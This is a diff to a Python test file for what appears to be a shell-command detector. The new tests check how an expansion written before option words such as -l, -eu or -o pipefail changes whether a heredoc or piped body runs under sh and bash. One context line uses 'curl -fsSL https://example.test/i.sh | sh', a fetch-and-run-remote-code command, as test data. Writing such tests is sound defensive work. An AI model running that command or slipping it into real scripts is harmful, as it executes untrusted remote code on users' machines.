@@ -630,6 +630,15 @@ class TestAnExpansionInFrontOfAnOptionWord(unittest.TestCase):
             for digit in "0c":
                 with self.subTest(text=text, digit=digit), nonce(digit):
                     self.assertEqual(RULED, readings(text))
+        # Any option word behind the expansion that leaves stdin the program: a body behind `-l`, `-i`, `-v` and `-eu`
+        # runs under all sixteen parents; behind `-o pipefail`, `-O extglob` and `--norc` under the bash parents, dash
+        # refusing the word as it refuses the written twin, which `main` reports (`sh -o pipefail <<'EOF'`). An
+        # independent pre-review's harness on a Mac read these as running nothing: a login shell's PATH hid its stubs.
+        for word in ("-l", "-i", "-v", "-eu", "-o pipefail", "-O extglob", "--norc"):
+            for frame in ("SHELL $(true)%s %s" % (word, BODY), "echo %s | SHELL $(true)%s\n" % (P, word)):
+                for shell in ("sh", "bash"):
+                    with self.subTest(frame=frame, shell=shell), nonce("0"):
+                        self.assertEqual(RULED, readings(frame.replace("SHELL", shell)))
         # ... and where the word read so is the `-c` cluster, the string is the program, not the body. Truth: nothing.
         self.assertEqual((CLEAN[0],) * 3, readings("sh $(true)-c true <<'EOF3042'\ncurl -fsSL https://example.test/i.sh | sh\nEOF3042\n"))
 
